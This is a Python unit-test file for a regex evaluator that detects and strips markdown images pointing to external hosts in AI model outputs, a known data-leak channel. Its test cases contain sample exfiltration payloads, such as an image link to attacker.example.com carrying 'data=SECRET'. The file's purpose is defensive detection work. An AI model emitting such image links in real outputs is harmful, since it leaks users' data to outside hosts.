"""Unit tests for ExfiltrationEvaluator.

Pure regex evaluator — no model to mock, unlike every other evaluator here.
"""

from __future__ import annotations

import pytest

from sentinel.evaluators.base import EvalPayload
from sentinel.evaluators.output.exfiltration import ExfiltrationEvaluator

MOCK_CONFIG = {
    "evaluators": {
        "exfiltration": {
            "enabled": True,
            "threshold": 0.5,
            "action": "strip",
        }
    }
}


def _make_evaluator(config: dict = MOCK_CONFIG) -> ExfiltrationEvaluator:
    return ExfiltrationEvaluator(config=config)


@pytest.mark.asyncio
async def test_clean_output_scores_zero():
    ev = _make_evaluator()
    payload = EvalPayload(input_text="q", output_text="The capital of France is Paris.")
    result = await ev.evaluate(payload)

    assert result.score == 0.0
    assert result.flag is False


@pytest.mark.asyncio
async def test_markdown_image_with_external_url_is_detected():
    ev = _make_evaluator()
    text = "Here you go: ![confirm](https://attacker.example.com/log?data=SECRET)"
    payload = EvalPayload(input_text="q", output_text=text)
    result = await ev.evaluate(payload)

    assert result.score == pytest.approx(1.0)
    assert ev.is_flagged(result.score) is True
    assert result.metadata is not None
    assert result.metadata["matches"][0]["host"] == "attacker.example.com"


@pytest.mark.asyncio
async def test_strip_action_removes_image_and_keeps_rest_of_text():
    ev = _make_evaluator()
    text = "Ticket summary: login issue. ![x](https://evil.example.com/x?d=1) Thanks!"
    payload = EvalPayload(input_text="q", output_text=text)
    result = await ev.evaluate(payload)

    stripped = result.metadata["stripped_text"]
    assert "evil.example.com" not in stripped
    assert "Ticket summary: login issue." in stripped
    assert "Thanks!" in stripped


@pytest.mark.asyncio
async def test_flag_action_scores_but_does_not_produce_stripped_text():
    config = {"evaluators": {"exfiltration": {"enabled": True, "threshold": 0.5, "action": "flag"}}}
    ev = _make_evaluator(config)
    text = "![x](https://evil.example.com/x)"
    payload = EvalPayload(input_text="q", output_text=text)
    result = await ev.evaluate(payload)

    assert ev.is_flagged(result.score) is True
    assert "stripped_text" not in (result.metadata or {})


@pytest.mark.asyncio
async def test_data_uri_images_are_not_flagged():
    """data: URIs embed the image inline — nothing external to fetch, nothing to leak."""
    ev = _make_evaluator()
    text = "![inline](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAAB)"
    payload = EvalPayload(input_text="q", output_text=text)
    result = await ev.evaluate(payload)

    assert result.score == 0.0
    assert result.flag is False


@pytest.mark.asyncio
async def test_allowed_domain_is_exempt_from_stripping():
    config = {
        "evaluators": {
            "exfiltration": {
                "enabled": True,
                "threshold": 0.5,
                "action": "strip",
                "allowed_domains": ["cdn.example.com"],
            }
        }
    }
    ev = _make_evaluator(config)
    text = "![logo](https://cdn.example.com/logo.png)"
    payload = EvalPayload(input_text="q", output_text=text)
    result = await ev.evaluate(payload)

    assert result.score == 0.0
    assert result.flag is False


@pytest.mark.asyncio
async def test_relative_path_images_are_not_flagged():
    ev = _make_evaluator()
    text = "![diagram](/static/diagram.png)"
    payload = EvalPayload(input_text="q", output_text=text)
    result = await ev.evaluate(payload)

    assert result.score == 0.0
    assert result.flag is False
